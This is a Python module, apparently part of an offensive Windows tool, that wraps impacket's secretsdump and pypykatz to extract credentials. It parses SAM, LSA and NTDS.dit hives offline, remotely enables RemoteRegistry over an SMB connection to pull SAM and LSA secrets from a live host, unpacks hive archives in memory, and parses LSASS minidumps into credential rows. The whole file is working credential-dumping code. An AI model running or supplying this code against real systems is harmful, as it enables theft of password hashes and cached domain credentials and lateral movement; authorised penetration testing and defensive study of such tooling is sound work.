"""Local parsing helpers for ephemeral credential-dump byte streams."""

import logging
import os
import tempfile
import zipfile
from io import BytesIO
from pathlib import Path
from typing import Dict, Iterable, List, Sequence

from impacket.examples.secretsdump import (
    LocalOperations,
    LSASecrets,
    NTDSHashes,
    RemoteOperations,
    SAMHashes,
)


def _write_private(path: Path, data: bytearray) -> None:
    flags = os.O_CREAT | os.O_EXCL | os.O_WRONLY
    if hasattr(os, "O_NOFOLLOW"):
        flags |= os.O_NOFOLLOW
    fd = os.open(path, flags, 0o600)
    try:
        with os.fdopen(fd, "wb") as handle:
            fd = -1
            handle.write(data)
    finally:
        if fd >= 0:
            os.close(fd)


def _stringify_secret(secret_type, value, enum_type=None) -> str:
    label = getattr(secret_type, "name", "")
    if not label and enum_type is not None:
        try:
            label = enum_type(secret_type).name
        except (TypeError, ValueError):
            label = next(
                (
                    name for name, candidate in vars(enum_type).items()
                    if name.isupper() and candidate == secret_type
                ),
                "",
            )
    if not label:
        label = str(secret_type)
    if isinstance(value, bytes):
        rendered = value.decode("utf-8", errors="replace")
    else:
        rendered = str(value)
    return f"[{label}] {rendered}" if label else rendered


def parse_registry_artifacts(mode: str, artifacts: Dict[str, bytearray]) -> List[str]:
    """Extract printable SAM/LSA or NTDS records from streamed hive bytes."""
    normalized = {name.upper(): value for name, value in artifacts.items()}
    if "SYSTEM" not in normalized:
        raise ValueError("SYSTEM hive is required for offline secret extraction")
    if mode == "sam" and "SAM" not in normalized:
        raise ValueError("SAM hive is required for SAM extraction")
    if mode == "ntds" and "NTDS.DIT" not in normalized:
        raise ValueError("ntds.dit is required for NTDS extraction")
    if mode == "lsa" and "SECURITY" not in normalized:
        raise ValueError("SECURITY hive is required for LSA extraction")
    if mode not in {"sam", "lsa", "ntds"}:
        raise ValueError(f"unsupported registry dump mode: {mode}")

    records: List[str] = []
    with tempfile.TemporaryDirectory(prefix="pwnrm-dump-") as directory:
        temp_dir = Path(directory)
        try:
            os.chmod(temp_dir, 0o700)
        except OSError:
            pass
        paths: Dict[str, Path] = {}
        for name, data in normalized.items():
            path = temp_dir / name.lower()
            _write_private(path, data)
            paths[name] = path

        local_ops = LocalOperations(str(paths["SYSTEM"]))
        boot_key = local_ops.getBootKey()
        if mode == "sam":
            sam = SAMHashes(
                str(paths["SAM"]),
                boot_key,
                isRemote=False,
                perSecretCallback=lambda value: records.append(str(value)),
            )
            try:
                sam.dump()
            finally:
                sam.finish()

        elif mode == "lsa":
            security_path = paths["SECURITY"]
            lsa = LSASecrets(
                str(security_path),
                boot_key,
                isRemote=False,
                perSecretCallback=lambda secret_type, value: records.append(
                    _stringify_secret(secret_type, value, LSASecrets.SECRET_TYPE)
                ),
            )
            try:
                lsa.dumpCachedHashes()
                lsa.dumpSecrets()
            finally:
                lsa.finish()
        else:
            no_lm_hash = local_ops.checkNoLMHashPolicy()
            local_domain_sid = NTDSHashes.getLocalDomainSid(str(paths["NTDS.DIT"]))
            ntds = NTDSHashes(
                str(paths["NTDS.DIT"]),
                boot_key,
                isRemote=False,
                noLMHash=no_lm_hash,
                useVSSMethod=True,
                localDomainSid=local_domain_sid,
                perSecretCallback=lambda secret_type, value: records.append(
                    _stringify_secret(secret_type, value, NTDSHashes.SECRET_TYPE)
                ),
            )
            try:
                ntds.dump()
            finally:
                ntds.finish()
    return records


def dump_remote_registry(smb_connection, mode: str, do_kerberos: bool = False) -> List[str]:
    """Dump SAM or LSA material through RemoteRegistry without bulk hive transfer."""
    normalized_mode = mode.lower()
    if normalized_mode not in {"sam", "lsa"}:
        raise ValueError(f"unsupported remote registry dump mode: {mode}")

    class MemoryRemoteHive:
        def __init__(self, data: bytearray):
            self.data = data
            self.offset = 0

        def open(self):
            self.offset = 0

        def seek(self, offset, whence=0):
            if whence == 0:
                self.offset = offset
            elif whence == 1:
                self.offset += offset
            elif whence == 2:
                self.offset = len(self.data) + offset
            return self.offset

        def tell(self):
            return self.offset

        def read(self, size=-1):
            if size is None or size < 0:
                size = len(self.data) - self.offset
            end = min(len(self.data), self.offset + size)
            chunk = bytes(self.data[self.offset:end])
            self.offset = end
            return chunk

        def close(self):
            self.offset = 0

    def buffer_remote_hive(remote_file, limit=64 * 1024 * 1024):
        payload = bytearray()
        remote_file.open()
        try:
            while True:
                chunk = remote_file.read(min(1024 * 1024, limit - len(payload) + 1))
                if not chunk:
                    break
                payload.extend(chunk)
                if len(payload) > limit:
                    raise ValueError("remote registry hive exceeds the memory limit")
        finally:
            remote_file.close()
        return payload

    records: List[str] = []
    remote_ops = RemoteOperations(smb_connection, do_kerberos, None)
    parser = None
    remote_file = None
    hive_data = None
    try:
        remote_ops.enableRegistry()
        boot_key = remote_ops.getBootKey()
        if normalized_mode == "sam":
            remote_file = remote_ops.saveSAM()
            hive_data = buffer_remote_hive(remote_file)
            parser = SAMHashes(
                MemoryRemoteHive(hive_data),
                boot_key,
                isRemote=True,
                perSecretCallback=lambda value: records.append(str(value)),
            )
            parser.dump()
        else:
            remote_file = remote_ops.saveSECURITY()
            hive_data = buffer_remote_hive(remote_file)
            parser = LSASecrets(
                MemoryRemoteHive(hive_data),
                boot_key,
                remoteOps=remote_ops,
                isRemote=True,
                perSecretCallback=lambda secret_type, value: records.append(
                    _stringify_secret(secret_type, value, LSASecrets.SECRET_TYPE)
                ),
            )
            parser.dumpCachedHashes()
            parser.dumpSecrets()
    finally:
        if parser is not None:
            try:
                parser.finish()
            except Exception as exc:
                logging.debug("in-memory registry parser cleanup failed: %s", exc)
        elif remote_file is not None:
            try:
                remote_file.close()
            except Exception:
                pass
        if hive_data is not None:
            zeroize([hive_data])
        # Impacket restores RemoteRegistry before it disconnects the winreg
        # RPC pipe. Some Windows builds reject that stop request while the pipe
        # is still active. Release it first, then let finish() restore state.
        registry_rpc = getattr(remote_ops, "_RemoteOperations__rrp", None)
        if registry_rpc is not None:
            try:
                registry_rpc.disconnect()
                setattr(remote_ops, "_RemoteOperations__rrp", None)
            except Exception as exc:
                logging.debug("RemoteRegistry RPC disconnect failed: %s", exc)
        try:
            remote_ops.finish()
        except Exception as exc:
            logging.debug("RemoteRegistry state restoration failed: %s", exc)
    return records


def extract_zip_artifacts(
    archive: bytearray,
    names: Sequence[str],
    max_uncompressed_bytes: int = 512 * 1024 * 1024,
) -> Dict[str, bytearray]:
    """Extract explicitly named archive members into memory with size guards."""
    wanted = {name.upper(): name for name in names}
    extracted: Dict[str, bytearray] = {}
    total = 0
    try:
        with zipfile.ZipFile(BytesIO(archive)) as handle:
            members = {}
            for info in handle.infolist():
                basename = Path(info.filename.replace("\\", "/")).name.upper()
                if basename in wanted:
                    if basename in members:
                        raise ValueError(f"duplicate archive member: {wanted[basename]}")
                    members[basename] = info
            missing = [original for key, original in wanted.items() if key not in members]
            if missing:
                raise ValueError(f"archive is missing required member(s): {', '.join(missing)}")
            for key, original in wanted.items():
                info = members[key]
                if info.flag_bits & 0x1:
                    raise ValueError(f"encrypted archive member is not supported: {original}")
                total += info.file_size
                if total > max_uncompressed_bytes:
                    raise ValueError("archive exceeds the uncompressed memory limit")
                payload = bytearray(handle.read(info))
                if len(payload) != info.file_size:
                    payload[:] = b"\x00" * len(payload)
                    raise ValueError(f"archive member length mismatch: {original}")
                extracted[original] = payload
    except zipfile.BadZipFile as exc:
        zeroize(extracted.values())
        raise ValueError("remote artifact archive is invalid") from exc
    except Exception:
        zeroize(extracted.values())
        raise
    return extracted


def parse_lsass_minidump(data: bytearray) -> List[str]:
    """Parse an LSASS minidump directly from memory and return grep-style rows."""
    from pypykatz.pypykatz import pypykatz

    parsed = pypykatz.parse_minidump_bytes(data)
    return [line for line in parsed.to_grep().splitlines() if line.strip()]


def zeroize(buffers: Iterable[bytearray]) -> None:
    for buffer in buffers:
        buffer[:] = b"\x00" * len(buffer)
